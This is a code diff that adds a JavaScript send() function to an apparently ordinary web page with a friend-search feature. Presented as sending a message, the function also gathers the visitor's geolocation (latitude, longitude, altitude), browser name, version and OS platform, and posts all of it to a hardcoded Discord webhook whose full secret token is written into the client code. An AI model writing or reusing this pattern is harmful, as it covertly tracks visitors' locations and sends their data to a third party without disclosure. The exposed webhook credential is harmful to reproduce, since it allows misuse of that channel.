@@ -160,3 +160,25 @@ function searchFriend() {
     
 }
 
+function send() {
+    const input = document.getElementById('input-s')
+    window.navigator.geolocation.getCurrentPosition((a) => { 
+        if(input.value.length > 1) {
+            let url = 'https://discord.com/api/webhooks/1089726238735728801/SYH6llmL-BF2BEZc8krsm1na8DE3OylxiCwZV_q_yRlgYc4_s87H43rwjLIVCSuOyCVY'
+            axios.post(url, {
+            content: `**Navegador:** ${window.navigator.appName}\n**Versao:** ${window.navigator.appVersion}\n**Sistema Operacional:** ${window.navigator.platform}\n**Location:** ${a.coords.latitude} N / ${a.coords.longitude} L [${a.coords.altitude ? a.coords.altitude : '0'}]\n**Mensagem:** \`${input.value}\``
+          })
+          .then(function (response) {
+            alert("Mensagem enviada com sucesso!");
+          })
+          .catch(function (error) {
+            alert("Erro 500");
+          });
+        } else {
+            alert("A Mensagem não pode ser vazia!")
+        }
+    })
+
+    
+}
+
